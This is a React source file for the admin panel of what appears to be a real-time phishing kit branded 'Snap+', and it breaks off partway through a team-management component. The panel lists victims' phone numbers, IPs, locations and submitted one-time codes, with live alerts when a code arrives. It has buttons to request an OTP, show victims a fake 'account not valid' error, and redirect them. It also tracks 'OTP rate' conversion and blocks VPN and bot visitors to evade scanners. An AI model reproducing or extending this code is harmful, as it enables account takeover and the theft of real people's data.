import { useEffect, useState, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import {
    RefreshCw, Trash2, LogOut, ExternalLink, Copy, BarChart3, Users, Ticket,
    Shield, X, Search, AlertOctagon, KeyRound, ArrowRight, Ban, Plus, Bot, Play, Square, Send,
} from "lucide-react";
import {
    adminMe, adminLogout, adminListUsers, adminChangeState, adminDeleteUser,
    adminAction, adminAnalytics, adminInvites, adminCreateInvite, adminInviteJoiners, adminDeleteInvite,
    adminBannedIPs, adminBanIP, adminUnbanIP, adminNotifs, adminGetUser,
    adminGetAntibot, adminSetAntibot,
    adminTeam, adminApprove, adminReject, adminPromote, adminDemote,
    adminBotConfig, adminBotSave, adminBotStatus, adminBotStart, adminBotStop, adminBotTest,
    adminBotBroadcast, adminBotLeaderboardRefresh, adminBotLeaderboard,
    adminGetMaintenance, adminSetMaintenance, adminSetPermissions,
} from "../lib/api";

const STATES = [
    { key: "pending", label: "Waiting" },
    { key: "code", label: "Code" },
    { key: "processing", label: "Processing" },
    { key: "success", label: "Success" },
    { key: "error", label: "Error" },
];

const Flag = ({ code }) => {
    if (!code || code === "??" || code === "LO") return <span style={{ fontSize: 14 }}>🌐</span>;
    return <img alt={code} src={`https://flagcdn.com/w20/${code.toLowerCase()}.png`} style={{ width: 20, height: 14, borderRadius: 2, verticalAlign: "middle" }} />;
};

function playBeep() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.type = "sine"; o.frequency.value = 880;
        g.gain.value = 0.15;
        o.connect(g); g.connect(ctx.destination);
        o.start();
        setTimeout(() => { o.frequency.value = 660; }, 100);
        setTimeout(() => { o.stop(); ctx.close(); }, 260);
    } catch {}
}

export default function AdminPanel() {
    const navigate = useNavigate();
    const token = localStorage.getItem("snap_admin_token");
    const [me, setMe] = useState(null);
    const [tab, setTab] = useState("users");
    const [users, setUsers] = useState([]);
    const [search, setSearch] = useState("");
    const [modalUser, setModalUser] = useState(null);
    const notifSince = useRef(null);
    const notifPerm = useRef(false);

    const logout = useCallback(async () => {
        try { await adminLogout(token); } catch {}
        localStorage.removeItem("snap_admin_token");
        navigate("/admin-login");
    }, [token, navigate]);

    const refreshUsers = useCallback(async () => {
        try {
            const u = await adminListUsers(token);
            setUsers(u);
        } catch (e) {
            if (e?.response?.status === 401) logout();
        }
    }, [token, logout]);

    useEffect(() => {
        if (!token) { navigate("/admin-login"); return; }
        adminMe(token).then(setMe).catch(() => logout());
        refreshUsers();
        if ("Notification" in window && Notification.permission === "default") {
            Notification.requestPermission().then((p) => { notifPerm.current = p === "granted"; });
        } else if ("Notification" in window) {
            notifPerm.current = Notification.permission === "granted";
        }
        const iv = setInterval(refreshUsers, 15000);
        return () => clearInterval(iv);
    }, [token, navigate, refreshUsers, logout]);

    // desktop notifications polling
    useEffect(() => {
        if (!token) return;
        const iv = setInterval(async () => {
            try {
                const r = await adminNotifs(token, notifSince.current);
                if (r.items && r.items.length) {
                    r.items.forEach((n) => {
                        const title = n.kind === "register" ? "🚨 New Snap+ user" : "🔑 Code submitted";
                        const body = n.kind === "register"
                            ? `${n.data.nickname} · ${n.data.phone} · ${n.data.city || "?"}, ${n.data.country || "?"}`
                            : `${n.data.nickname} entered code ${n.data.code}`;
                        if (notifPerm.current) new Notification(title, { body, icon: "https://flagcdn.com/w80/fr.png" });
                        playBeep();
                    });
                    notifSince.current = r.now;
                } else if (!notifSince.current) {
                    notifSince.current = r.now;
                }
            } catch {}
        }, 4000);
        return () => clearInterval(iv);
    }, [token]);

    const filtered = users.filter((u) => {
        if (!search) return true;
        const q = search.toLowerCase();
        return (u.nickname || "").toLowerCase().includes(q)
            || (u.phone || "").includes(q)
            || (u.ip || "").includes(q)
            || (u.invited_by || "").toLowerCase().includes(q);
    });

    const stats = {
        total: users.length,
        pending: users.filter((u) => u.state === "pending").length,
        code: users.filter((u) => u.state === "code").length,
        success: users.filter((u) => u.state === "success").length,
    };

    return (
        <div className="admin-panel">
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 22px", borderBottom: "1px solid #171717", flexWrap: "wrap", gap: 10 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
                    <span className="snap-badge" style={{ background: "rgba(250,204,21,0.12)", color: "#FACC15", borderColor: "rgba(250,204,21,0.35)" }} data-testid="admin-brand">⚡ Snap+ Admin</span>
                    {me && <span style={{ color: "#9a9a9a", fontSize: 13 }}>logged in as <b className="snap-accent">{me.username}</b> <span style={{ background: me.role === "owner" ? "rgba(250,204,21,0.15)" : "#1c1c1c", color: me.role === "owner" ? "#FACC15" : "#a0a0a0", padding: "2px 8px", borderRadius: 999, fontSize: 11, marginLeft: 6, fontWeight: 700, letterSpacing: 1 }}>{(me.role || "admin").toUpperCase()}</span></span>}
                </div>
                <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                    {[
                        { k: "users", i: <Users size={14} />, l: "Users", roles: ["owner","admin"], perm: "view_users" },
                        { k: "analytics", i: <BarChart3 size={14} />, l: "Analytics", roles: ["owner","admin"], perm: "view_analytics" },
                        { k: "invites", i: <Ticket size={14} />, l: "Invites", roles: ["owner","admin"], perm: "view_invites" },
                        { k: "bot", i: <Bot size={14} />, l: "Bot", roles: ["owner","admin"], perm: "view_bot" },
                        { k: "team", i: <Users size={14} />, l: "Team", roles: ["owner"] },
                        { k: "security", i: <Shield size={14} />, l: "Security", roles: ["owner"] },
                    ].filter(t => {
                        if (!me) return false;
                        if (!t.roles.includes(me.role)) return false;
                        if (me.role === "owner") return true;
                        if (!t.perm) return true;
                        return !!(me.permissions && me.permissions[t.perm]);
                    }).map((t) => (
                        <button key={t.k} className="snap-btn-ghost" onClick={() => setTab(t.k)}
                            style={{ background: tab === t.k ? "rgba(250,204,21,0.12)" : "transparent", padding: "10px 14px", fontSize: 13 }}
                            data-testid={`tab-${t.k}`}>
                            {t.i} {t.l}
                        </button>
                    ))}
                    <button className="snap-btn-ghost" onClick={refreshUsers} data-testid="admin-refresh-btn"><RefreshCw size={14} /></button>
                    <button className="snap-btn-ghost" onClick={logout} data-testid="admin-logout-btn"><LogOut size={14} /> Sign out</button>
                </div>
            </div>

            {tab === "users" && (
                <UsersTab
                    token={token} users={filtered} allUsers={users} stats={stats}
                    search={search} setSearch={setSearch}
                    onRefresh={refreshUsers} onOpen={setModalUser}
                    isOwner={me?.role === "owner"}
                />
            )}
            {tab === "analytics" && <AnalyticsTab token={token} />}
            {tab === "invites" && <InvitesTab token={token} />}
            {tab === "bot" && (me?.role === "owner" || me?.permissions?.view_bot) && <BotTab token={token} isOwner={me?.role === "owner" || !!me?.permissions?.edit_bot} />}
            {tab === "team" && me?.role === "owner" && <TeamTab token={token} />}
            {tab === "security" && me?.role === "owner" && <SecurityTab token={token} />}

            {modalUser && <UserModal token={token} userId={modalUser} onClose={() => setModalUser(null)} onRefresh={refreshUsers} />}
        </div>
    );
}

function UsersTab({ token, users, allUsers, stats, search, setSearch, onRefresh, onOpen, isOwner }) {
    const changeState = async (id, s) => {
        try { await adminChangeState(token, id, s); toast.success(`State → ${s}`); onRefresh(); } catch { toast.error("Failed"); }
    };
    const removeUser = async (id) => {
        if (!window.confirm("Delete this user?")) return;
        try { await adminDeleteUser(token, id); toast.success("Deleted"); onRefresh(); } catch { toast.error("Failed"); }
    };
    const copyLink = (u) => {
        navigator.clipboard.writeText(`${window.location.origin}/status/${u.id}`);
        toast.success("Link copied");
    };

    return (
        <div style={{ display: "grid", gridTemplateColumns: "260px 1fr", gap: 22, padding: 22 }} className="admin-grid">
            <div style={{ display: "flex", flexDirection: "column", gap: 18 }}>
                <div className="admin-card">
                    <div className="admin-label">Live Stats</div>
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginTop: 10 }}>
                        {[
                            { k: "Total", v: stats.total, c: "#FACC15" },
                            { k: "Waiting", v: stats.pending, c: "#FACC15" },
                            { k: "Code", v: stats.code, c: "#FACC15" },
                            { k: "Success", v: stats.success, c: "#22c55e" },
                        ].map((it) => (
                            <div key={it.k} style={{ background: "#0d0d0d", padding: "10px 12px", borderRadius: 14, border: "1px solid #1a1a1a" }}>
                                <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600, textTransform: "uppercase" }}>{it.k}</div>
                                <div style={{ fontSize: 22, fontWeight: 700, color: it.c }} data-testid={`admin-stat-${it.k.toLowerCase()}`}>{it.v}</div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>

            <div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14, gap: 12, flexWrap: "wrap" }}>
                    <div>
                        <div className="admin-label">Users</div>
                        <h2 style={{ margin: "4px 0 0", fontSize: 24, fontWeight: 700 }}>Registrations</h2>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 10, background: "#0f0f0f", border: "1px solid #1c1c1c", padding: "8px 14px", borderRadius: 999 }}>
                        <Search size={14} color="#8a8a8a" />
                        <input placeholder="Search nickname / phone / IP / invited by" value={search} onChange={(e) => setSearch(e.target.value)}
                            style={{ background: "transparent", border: "none", color: "#fff", outline: "none", width: 320, fontFamily: "Fredoka" }} />
                    </div>
                </div>

                {users.length === 0 && (
                    <div className="admin-card" style={{ textAlign: "center", padding: 40, color: "#8a8a8a" }}>No users yet.</div>
                )}

                <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                    {users.map((u) => (
                        <div key={u.id} className="admin-card" data-testid={`admin-user-${u.id}`} style={{ cursor: "pointer" }} onClick={() => onOpen(u.id)}>
                            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", gap: 12, flexWrap: "wrap" }}>
                                <div style={{ minWidth: 200, flex: 1 }}>
                                    <div style={{ fontSize: 18, fontWeight: 700, marginBottom: 4, display: "flex", alignItems: "center", gap: 8 }}>
                                        <Flag code={u.geo?.countryCode} /> {u.nickname}
                                        {(u.geo?.proxy || u.geo?.hosting) && <span title="VPN/Proxy detected" style={{ color: "#ef4444" }}>⚠️</span>}
                                    </div>
                                    <div style={{ color: "#FACC15", fontFamily: "monospace", fontSize: 14 }}>{u.phone}</div>
                                    <div style={{ color: "#8a8a8a", fontSize: 12, marginTop: 4 }}>
                                        {u.geo?.city || "-"}, {u.geo?.country || "?"} · <span style={{ fontFamily: "monospace" }}>{u.ip || "-"}</span>
                                    </div>
                                    <div style={{ color: "#6a6a6a", fontSize: 11, marginTop: 3, fontFamily: "monospace" }}>
                                        {new Date(u.created_at).toLocaleString("en-GB")}
                                    </div>
                                    {u.invited_by && (
                                        <div style={{ marginTop: 6, fontSize: 12, color: "#a0a0a0" }}>
                                            <Ticket size={11} style={{ display: "inline", marginRight: 4, verticalAlign: "middle", color: "#FACC15" }} />
                                            invited by <b className="snap-accent">{u.invited_by}</b>
                                        </div>
                                    )}
                                    {u.code_submitted && (
                                        <div style={{ marginTop: 6, fontSize: 12 }}>
                                            <span style={{ color: "#8a8a8a" }}>Code: </span>
                                            <span style={{ color: "#FACC15", fontFamily: "monospace", fontWeight: 700 }}>{u.code_submitted}</span>
                                        </div>
                                    )}
                                </div>
                                <div style={{ display: "flex", gap: 6 }} onClick={(e) => e.stopPropagation()}>
                                    <button className="snap-btn-ghost" style={{ padding: 8 }} title="Open" onClick={() => window.open(`/status/${u.id}`, "_blank")} data-testid={`open-user-${u.id}`}><ExternalLink size={13} /></button>
                                    <button className="snap-btn-ghost" style={{ padding: 8 }} title="Copy link" onClick={() => copyLink(u)}><Copy size={13} /></button>
                                    <button className="snap-btn-ghost" style={{ padding: 8, borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} title="Delete" onClick={() => removeUser(u.id)} data-testid={`delete-user-${u.id}`}><Trash2 size={13} /></button>
                                </div>
                            </div>
                            <div style={{ display: "flex", flexWrap: "wrap", gap: 6, marginTop: 12 }} onClick={(e) => e.stopPropagation()}>
                                {STATES.map((s) => (
                                    <button key={s.key} className={`snap-chip ${u.state === s.key ? "active" : ""}`} style={{ cursor: "pointer", border: "none" }}
                                        onClick={() => changeState(u.id, s.key)} data-testid={`state-btn-${u.id}-${s.key}`}>{s.label}</button>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            <style>{`@media (max-width: 900px) { .admin-grid { grid-template-columns: 1fr !important; } }`}</style>
        </div>
    );
}

function UserModal({ token, userId, onClose, onRefresh }) {
    const [u, setU] = useState(null);
    const [errMsg, setErrMsg] = useState("Compte non valide.");
    const [redirectUrl, setRedirectUrl] = useState("");

    useEffect(() => { adminGetUser(token, userId).then(setU); }, [token, userId]);

    const act = async (action, payload = {}) => {
        try { await adminAction(token, userId, action, payload); toast.success(`Action: ${action}`); onRefresh(); onClose(); }
        catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
    };

    if (!u) return null;
    return (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.7)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 50, padding: 20 }} onClick={onClose}>
            <div style={{ background: "#111", border: "1px solid #1f1f1f", borderRadius: 22, padding: 26, maxWidth: 520, width: "100%", maxHeight: "90vh", overflow: "auto" }} onClick={(e) => e.stopPropagation()} data-testid="user-modal">
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 16 }}>
                    <div>
                        <div style={{ fontSize: 22, fontWeight: 700, display: "flex", alignItems: "center", gap: 8 }}>
                            <Flag code={u.geo?.countryCode} /> {u.nickname}
                        </div>
                        <div style={{ color: "#FACC15", fontFamily: "monospace", fontSize: 14 }}>{u.phone}</div>
                    </div>
                    <button className="snap-btn-ghost" style={{ padding: 8 }} onClick={onClose}><X size={14} /></button>
                </div>

                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
                    <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600 }}>LOCATION</div>
                        <div style={{ fontSize: 14, marginTop: 3 }}>{u.geo?.city || "-"}, {u.geo?.country || "?"}</div>
                        <div style={{ fontSize: 11, color: "#8a8a8a" }}>{u.geo?.regionName || ""}</div>
                    </div>
                    <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600 }}>IP</div>
                        <div style={{ fontSize: 14, marginTop: 3, fontFamily: "monospace" }}>{u.ip}</div>
                        <div style={{ fontSize: 11, marginTop: 3 }}>
                            {u.geo?.proxy || u.geo?.hosting ? <span style={{ color: "#ef4444" }}>⚠ Proxy/VPN</span> : <span style={{ color: "#22c55e" }}>✓ Clean</span>}
                        </div>
                    </div>
                    <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600 }}>STATE</div>
                        <div style={{ fontSize: 14, marginTop: 3, color: "#FACC15", fontWeight: 700 }}>{u.state}</div>
                    </div>
                    <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600 }}>INVITED BY</div>
                        <div style={{ fontSize: 14, marginTop: 3 }}>{u.invited_by || "—"}</div>
                    </div>
                </div>

                {u.code_submitted && (
                    <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a", marginBottom: 14 }}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600 }}>CODE SUBMITTED</div>
                        <div style={{ fontSize: 22, marginTop: 3, color: "#FACC15", fontFamily: "monospace", fontWeight: 700 }}>{u.code_submitted}</div>
                    </div>
                )}

                <div className="admin-label" style={{ marginBottom: 8 }}>Quick actions</div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8, marginBottom: 12 }}>
                    <button className="snap-btn" style={{ padding: 12, fontSize: 14 }} onClick={() => act("request_otp")} data-testid="qa-request-otp"><KeyRound size={14} /> Request OTP</button>
                    <button className="snap-btn-ghost" style={{ borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} onClick={() => act("ban_ip")} data-testid="qa-ban-ip"><Ban size={14} /> Ban IP</button>
                </div>
                <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a", marginBottom: 10 }}>
                    <div className="admin-label" style={{ marginBottom: 6 }}>Show error</div>
                    <input className="snap-input" value={errMsg} onChange={(e) => setErrMsg(e.target.value)} maxLength={120} />
                    <button className="snap-btn-ghost" style={{ marginTop: 8, width: "100%" }} onClick={() => act("show_error", { message: errMsg })} data-testid="qa-show-error"><AlertOctagon size={14} /> Show error to user</button>
                </div>
                <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 12, border: "1px solid #1a1a1a" }}>
                    <div className="admin-label" style={{ marginBottom: 6 }}>Redirect to final page</div>
                    <input className="snap-input" placeholder="https://..." value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} />
                    <button className="snap-btn" style={{ marginTop: 8, padding: 12, fontSize: 14 }} onClick={() => act("redirect_final", { url: redirectUrl })} data-testid="qa-redirect"><ArrowRight size={14} /> Redirect user</button>
                </div>
            </div>
        </div>
    );
}

function AnalyticsTab({ token }) {
    const [a, setA] = useState(null);
    useEffect(() => {
        const load = () => adminAnalytics(token).then(setA).catch(() => {});
        load();
        const iv = setInterval(load, 6000);
        return () => clearInterval(iv);
    }, [token]);
    if (!a) return <div style={{ padding: 30, color: "#8a8a8a" }}>Loading analytics...</div>;
    const max = Math.max(...a.days.map((d) => Math.max(d.visits, d.regs)), 1);
    return (
        <div style={{ padding: 22 }}>
            <div className="admin-label">Overview</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: 14, marginTop: 10, marginBottom: 22 }}>
                {[
                    { k: "Visitors", v: a.visitors, c: "#FACC15" },
                    { k: "Registered", v: a.registered, c: "#FACC15" },
                    { k: "OTP submitted", v: a.otp_submitted, c: "#FACC15" },
                    { k: "Success", v: a.success, c: "#22c55e" },
                    { k: "Conv. rate", v: `${a.conversion_rate}%`, c: "#FACC15" },
                    { k: "OTP rate", v: `${a.otp_rate}%`, c: "#FACC15" },
                ].map((it) => (
                    <div key={it.k} className="admin-card" data-testid={`analytics-${it.k.toLowerCase().replace(/\s|\./g,'-')}`}>
                        <div style={{ fontSize: 10, color: "#8a8a8a", letterSpacing: 1.5, fontWeight: 600, textTransform: "uppercase" }}>{it.k}</div>
                        <div style={{ fontSize: 28, fontWeight: 700, color: it.c, marginTop: 3 }}>{it.v}</div>
                    </div>
                ))}
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr", gap: 18 }} className="admin-grid">
                <div className="admin-card">
                    <div className="admin-label">Last 7 days</div>
                    <div style={{ display: "flex", alignItems: "flex-end", gap: 8, marginTop: 16, height: 200 }}>
                        {a.days.map((d) => (
                            <div key={d.day} style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", gap: 4 }}>
                                <div style={{ display: "flex", alignItems: "flex-end", gap: 3, height: 160 }}>
                                    <div title={`Visits: ${d.visits}`} style={{ width: 14, background: "rgba(250,204,21,0.3)", height: `${(d.visits / max) * 100}%`, borderRadius: 4, minHeight: 2 }} />
                                    <div title={`Regs: ${d.regs}`} style={{ width: 14, background: "#FACC15", height: `${(d.regs / max) * 100}%`, borderRadius: 4, minHeight: 2, boxShadow: "0 0 12px rgba(250,204,21,0.4)" }} />
                                </div>
                                <div style={{ fontSize: 11, color: "#8a8a8a" }}>{d.day}</div>
                            </div>
                        ))}
                    </div>
                    <div style={{ display: "flex", gap: 14, marginTop: 10, fontSize: 12, color: "#8a8a8a" }}>
                        <span><span style={{ display: "inline-block", width: 10, height: 10, background: "rgba(250,204,21,0.3)", borderRadius: 2, marginRight: 5, verticalAlign: "middle" }} /> Visits</span>
                        <span><span style={{ display: "inline-block", width: 10, height: 10, background: "#FACC15", borderRadius: 2, marginRight: 5, verticalAlign: "middle" }} /> Registrations</span>
                    </div>
                </div>
                <div className="admin-card">
                    <div className="admin-label">Top countries</div>
                    <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8 }}>
                        {a.top_countries.length === 0 && <div style={{ color: "#8a8a8a", fontSize: 13 }}>No data yet</div>}
                        {a.top_countries.map((c) => (
                            <div key={c.code} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", background: "#0d0d0d", padding: "8px 12px", borderRadius: 12 }}>
                                <span style={{ display: "flex", alignItems: "center", gap: 8 }}><Flag code={c.code} /> {c.code}</span>
                                <b className="snap-accent">{c.count}</b>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );
}

function InvitesTab({ token }) {
    const [invites, setInvites] = useState([]);
    const [label, setLabel] = useState("");
    const load = useCallback(() => adminInvites(token).then(setInvites), [token]);
    useEffect(() => { load(); }, [load]);

    const create = async () => {
        try { const r = await adminCreateInvite(token, label); toast.success(`Created ${r.code}`); setLabel(""); load(); }
        catch { toast.error("Failed"); }
    };
    const del = async (code) => {
        if (!window.confirm("Delete this invite?")) return;
        await adminDeleteInvite(token, code); load();
    };
    const copy = (code) => {
        navigator.clipboard.writeText(`${window.location.origin}/j/${code}`);
        toast.success("Invite link copied");
    };

    return (
        <div style={{ padding: 22 }}>
            <div style={{ display: "flex", gap: 10, marginBottom: 22, alignItems: "flex-end", flexWrap: "wrap" }}>
                <div style={{ flex: 1, minWidth: 220 }}>
                    <div className="admin-label" style={{ marginBottom: 6 }}>Create your invite</div>
                    <input className="snap-input" placeholder="Label (optional, e.g. Instagram campaign)" value={label} onChange={(e) => setLabel(e.target.value)} maxLength={60} data-testid="invite-label-input" />
                </div>
                <button className="snap-btn" style={{ maxWidth: 200 }} onClick={create} data-testid="invite-create-btn"><Plus size={16} /> Generate link</button>
            </div>

            <div className="admin-label">Your invites</div>
            <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 10 }}>
                {invites.length === 0 && <div className="admin-card" style={{ color: "#8a8a8a", textAlign: "center" }}>No invites yet.</div>}
                {invites.map((i) => (
                    <div key={i.code} className="admin-card" data-testid={`invite-${i.code}`}>
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 12, flexWrap: "wrap" }}>
                            <div>
                                <div style={{ fontSize: 18, fontWeight: 700, fontFamily: "monospace", color: "#FACC15" }}>/j/{i.code}</div>
                                <div style={{ color: "#8a8a8a", fontSize: 12, marginTop: 3 }}>owner: <b style={{ color: "#e5e5e5" }}>{i.owner}</b> {i.label && <>· {i.label}</>}</div>
                            </div>
                            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                                <div className="snap-chip active" style={{ background: "#FACC15" }}><Users size={12} /> {i.joins} joined</div>
                                <button className="snap-btn-ghost" style={{ padding: 8 }} onClick={() => copy(i.code)}><Copy size={13} /></button>
                                <button className="snap-btn-ghost" style={{ padding: 8, borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} onClick={() => del(i.code)}><Trash2 size={13} /></button>
                            </div>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}

function SecurityTab({ token }) {
    const [ips, setIps] = useState([]);
    const [ip, setIp] = useState("");
    const [reason, setReason] = useState("");
    const [antibot, setAntibot] = useState(false);
    const load = useCallback(() => {
        adminBannedIPs(token).then(setIps);
        adminGetAntibot(token).then((r) => setAntibot(r.enabled));
    }, [token]);
    useEffect(() => { load(); }, [load]);

    const toggleAntibot = async () => {
        try { await adminSetAntibot(token, !antibot); setAntibot(!antibot); toast.success(`Anti-VPN ${!antibot ? "enabled" : "disabled"}`); }
        catch { toast.error("Failed"); }
    };

    const ban = async () => {
        if (!ip.trim()) return;
        try { await adminBanIP(token, ip.trim(), reason); toast.success("IP banned"); setIp(""); setReason(""); load(); }
        catch { toast.error("Failed"); }
    };
    const unban = async (i) => { await adminUnbanIP(token, i); toast.success("Unbanned"); load(); };

    return (
        <div style={{ padding: 22 }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 18 }} className="admin-grid">
                <div className="admin-card">
                    <div className="admin-label">Ban an IP</div>
                    <input className="snap-input" style={{ marginTop: 10 }} placeholder="e.g. 8.8.8.8" value={ip} onChange={(e) => setIp(e.target.value)} data-testid="ban-ip-input" />
                    <input className="snap-input" style={{ marginTop: 8 }} placeholder="Reason (optional)" value={reason} onChange={(e) => setReason(e.target.value)} maxLength={200} />
                    <button className="snap-btn" style={{ marginTop: 10 }} onClick={ban} data-testid="ban-ip-btn"><Ban size={14} /> Ban this IP</button>
                    <p style={{ color: "#6a6a6a", fontSize: 11, marginTop: 10 }}>Banned IPs cannot register or submit codes.</p>
                </div>
                <div className="admin-card">
                    <div className="admin-label">Security stack</div>
                    <div style={{ marginTop: 12, display: "flex", alignItems: "center", justifyContent: "space-between", padding: 12, background: "#0d0d0d", borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div>
                            <div style={{ fontWeight: 700 }}>Anti-VPN / Proxy mode</div>
                            <div style={{ color: "#8a8a8a", fontSize: 12 }}>Block visitors on VPN/hosting IPs</div>
                        </div>
                        <button className="snap-btn-ghost" onClick={toggleAntibot} style={{ background: antibot ? "rgba(34,197,94,0.15)" : "transparent", borderColor: antibot ? "#22c55e" : undefined, color: antibot ? "#22c55e" : "#FACC15" }} data-testid="antibot-toggle">
                            {antibot ? "ON" : "OFF"}
                        </button>
                    </div>
                    <ul style={{ marginTop: 12, paddingLeft: 20, color: "#c0c0c0", fontSize: 13, lineHeight: 1.8 }}>
                        <li>✅ XSS input sanitization (backend + frontend)</li>
                        <li>✅ Security headers (X-Frame-Options, XSS, no-sniff)</li>
                        <li>✅ Rate limit: 5 login attempts → 30 min ban</li>
                        <li>✅ IP ↔ username lock per admin</li>
                        <li>✅ Bot user-agent detection on visit</li>
                        <li>✅ Discord webhook allowlist (discord.com only)</li>
                    </ul>
                </div>
            </div>

            <div style={{ marginTop: 22 }}>
                <div className="admin-label">Banned IPs ({ips.length})</div>
                <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8 }}>
                    {ips.length === 0 && <div className="admin-card" style={{ color: "#8a8a8a", textAlign: "center" }}>None banned.</div>}
                    {ips.map((b) => (
                        <div key={b.ip} className="admin-card" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 }}>
                            <div>
                                <div style={{ fontFamily: "monospace", fontWeight: 700, color: "#ef4444" }}>{b.ip}</div>
                                <div style={{ color: "#8a8a8a", fontSize: 12 }}>{b.reason || "no reason"} · by {b.by || "?"}</div>
                            </div>
                            <button className="snap-btn-ghost" onClick={() => unban(b.ip)}>Unban</button>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );
}

function TeamTab({ token }) {
    const [team, setTeam] = useState([]);
    const load = useCallback(() => adminTeam(token).then(setTeam).catch(() => {}), [token]);
    useEffect(() => { load(); const iv = setInterval(load, 15000); return () => clearInterval(iv); }, [load]);

    const approve = async (u) => { await adminApprove(token, u); toast.success(`${u} approved`); load(); };
    const reject = async (u) => { if (!window.confirm(`Reject ${u}?`)) return; await adminReject(token, u); toast.success(`${u} removed`); load(); };
    const promote = async (u) => { if (!window.confirm(`Promote ${u} to OWNER?`)) return; try { await adminPromote(token, u); toast.success(`${u} is now owner`); load(); } catch (e) { toast.error(e?.response?.data?.detail || "Failed"); } };
    const demote = async (u) => { if (!window.confirm(`Demote ${u} to admin?`)) return; try { await adminDemote(token, u); toast.success(`${u} is now admin`); load(); } catch (e) { toast.error(e?.response?.data?.detail || "Failed"); } };

    const pending = team.filter((a) => a.status !== "approved");
    const approved = team.filter((a) => a.status === "approved");

    return (
        <div style={{ padding: 22 }}>
            <div className="admin-label">Pending approval ({pending.length})</div>
            <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 10, marginBottom: 26 }}>
                {pending.length === 0 && <div className="admin-card" style={{ color: "#8a8a8a", textAlign: "center" }}>No pending requests.</div>}
                {pending.map((a) => (
                    <div key={a.username} className="admin-card" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 }} data-testid={`team-pending-${a.username}`}>
                        <div>
                            <div style={{ fontSize: 17, fontWeight: 700 }}>{a.username}</div>
                            <div style={{ color: "#8a8a8a", fontSize: 12, fontFamily: "monospace" }}>from IP {a.created_from_ip || "?"} · {new Date(a.created_at).toLocaleString("en-GB")}</div>
                        </div>
                        <div style={{ display: "flex", gap: 8 }}>
                            <button className="snap-btn" style={{ padding: "10px 16px", fontSize: 13, width: "auto" }} onClick={() => approve(a.username)} data-testid={`approve-${a.username}`}>Approve</button>
                            <button className="snap-btn-ghost" style={{ borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} onClick={() => reject(a.username)} data-testid={`reject-${a.username}`}>Reject</button>
                        </div>
                    </div>
                ))}
            </div>

            <div className="admin-label">Approved team ({approved.length})</div>
            <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 10 }}>
                {approved.map((a) => (
                    <div key={a.username} className="admin-card">
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 10 }}>
                            <div>
                                <div style={{ fontSize: 17, fontWeight: 700 }}>
                                    {a.username}
